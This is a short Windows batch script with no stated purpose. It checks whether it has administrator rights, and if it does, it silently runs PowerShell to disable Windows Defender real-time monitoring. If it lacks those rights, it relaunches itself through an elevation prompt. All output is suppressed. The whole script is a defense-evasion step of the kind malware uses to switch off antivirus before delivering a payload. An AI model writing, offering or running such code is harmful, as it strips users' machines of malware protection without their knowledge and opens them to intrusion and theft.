@echo off
:: 1
net session >nul 2>&1
if %errorLevel% == 0 (
    powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
) else (
    powershell -Command "Start-Process -FilePath '%0' -Verb RunAs" >nul 2>&1
)

